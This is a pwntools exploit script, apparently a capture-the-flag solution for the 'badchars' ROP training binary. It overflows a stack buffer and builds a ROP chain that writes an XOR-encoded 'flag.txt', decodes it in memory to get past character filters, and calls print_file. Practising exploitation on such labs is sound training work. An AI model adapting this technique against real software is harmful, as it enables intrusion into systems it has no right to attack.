from pwn import *

p = process('./badchars')

debug = False

if debug:
    print("gdb <bin> -q <pid> @ %d" % p.pid)
    pause()

badchars = [b'x', b'g', b'a', b'.']

pop_rdi = p64(0x00000000004006a3)
xor = p64(0x0000000000400628)  # xor byte ptr [r15], r14b ; ret
pop_r12_r13_r14_r15 = p64(0x000000000040069c) # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_r14_r15 = p64(0x00000000004006a0) # pop r14 ; pop r15 ; ret
mov_qword_ptr = p64(0x0000000000400634) # mov qword ptr [r13], r12 ; ret
print_file_call = p64(0x0000000000400620)
xor_byte = 0x3
flag_str = b"flag.txt"
flag_file_xor = bytes([b ^ xor_byte for b in flag_str])  # xored
reserved_addr_data = 0x000000000601030  # reserved data addr, free space

payload = b'A'*32 + b'B'*8

payload += pop_r12_r13_r14_r15
payload += flag_file_xor
payload += p64(reserved_addr_data)
payload += p64(xor_byte)  # r14; temp junk
payload += p64(reserved_addr_data)  # r15; temp junk
payload += mov_qword_ptr

for i in range(0, 8):
    payload += pop_r14_r15
    payload += p64(xor_byte) # xor byte -> r14
    payload += p64(reserved_addr_data + i) # byte addr -> r15
    payload += xor

payload += pop_rdi
payload += p64(reserved_addr_data)
payload += print_file_call

# Send and interact
p.sendline(payload)
p.interactive()
